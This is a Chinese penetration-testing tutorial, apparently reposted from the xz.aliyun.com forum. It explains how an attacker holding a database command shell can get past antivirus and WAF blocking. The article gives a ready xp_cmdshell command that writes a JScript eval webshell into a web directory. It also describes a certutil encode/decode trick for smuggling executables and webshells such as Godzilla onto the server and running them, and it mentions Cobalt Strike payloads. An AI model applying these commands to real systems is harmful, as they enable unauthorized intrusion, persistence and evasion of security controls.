> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/8930)

各位在渗透中是否遇见过这个问题：  
虽然有低权限命令 shell，如 mssql、postgres 等，执行下载总是各种无权限或者被 AV 杀，轻则无法继续渗透，重则弹出拦截消息，管理员上机后立马发现。  
本文将介绍一种使用 windows 自带工具进行编码，写入编码数据到 TXT 文本最后再解码的骚操作。  
**1. 场景**  
话不多说，例如这样场景：在数据库连接后或者 sqlmap 注入连接 os-shell 后可执行命令：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180309-0dcf42a6-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180309-0dcf42a6-49bd-1.png)  
其中包括杀软或某狗、某盾：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180322-1594c650-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180322-1594c650-49bd-1.png)  
此时下载文件的各种命令均被拦截：  
bitsadmin：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180332-1b9b3f98-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180332-1b9b3f98-49bd-1.png)  
certutil 证书：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180341-20c5e81a-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180341-20c5e81a-49bd-1.png)  
还会被杀软报警：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180356-29a77886-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180356-29a77886-49bd-1.png)  
powershell 也会被彻底封杀：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180408-30eab37e-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180408-30eab37e-49bd-1.png)  
尤其是某管家，拦截更彻底，根本没有倒计时自动消失（此时需要夸一下某大厂的报警提示倒计时功能）  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180418-36c7aa04-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180418-36c7aa04-49bd-1.png)  
而在这种环境下可在有权限写入的前提下尝试写入一句话木马：

```
xp_cmdshell 'echo  ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["bmfx"], "unsafe");%^>> D:\\WWW\\bmfx.aspx'
```

但也存在被某狗、WAF 杀掉的可能。

**2. 骚操作**  
此时，骚操作上场，windows 自带的证书下载，也就是上文使用但远程下载被拦截的 Certutil，还可用来对文件编码解码：  
本地：

```
Certutil -encode artifact.txt artifact.exe
或指定路径：
Certutil -encode d:\artifact.txt d:\artifact.exe


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180515-592f2dba-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180515-592f2dba-49bd-1.png)  
将 txt 文本使用 echo 命令：  
echo sfAFASFAsfasgasdf………>>d:\1.txt  
写入服务器后，进入 txt 所在目录执行解码（或直接指定物理目录文件）：

```
Certutil -decode art.txt art.exe
或：
Certutil -decode d:\art.txt d:\art.exe


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180530-621a135e-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180530-621a135e-49bd-1.png)  
后续可在命令中执行 exe 上线：

重点是：本地解码编码操作不会触发杀软拦截行为！此外，Certutil 支持将任意文件编码解码，除了 exe 还有 aspx、php、jsp 等（如加密免杀的 webshell，此处使用哥斯拉为例）：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180544-6a5da2a6-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180544-6a5da2a6-49bd-1.png)  
可在 web 站点写入文件后访问 txt 查看写入有无偏差：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180554-7046da16-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180554-7046da16-49bd-1.png)  
还有一点，本人亲测，编码后 txt 中的文本类似于生成的 shellcode，会自动换行显示，但本地替换换行符、自行拆分换行符，不改变内容的前提下，编码、解码前后的文件不会有任何影响。  
但是在 navicat 等数据库软件里操作的话还有一个限制，echo 的长度会提示不要过长：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201229180608-78bd1714-49bd-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201229180608-78bd1714-49bd-1.png)  
此时就要看各位师傅们在 bypass WaF、AV 时如何减小体量了，一般 cs 的马 bypass 后会在 50k 左右，使用 sqlmap 的—os-shell 执行 echo 不会像 navicat 要求 128 字符那么短，但也有长度限制，具体各位可亲测。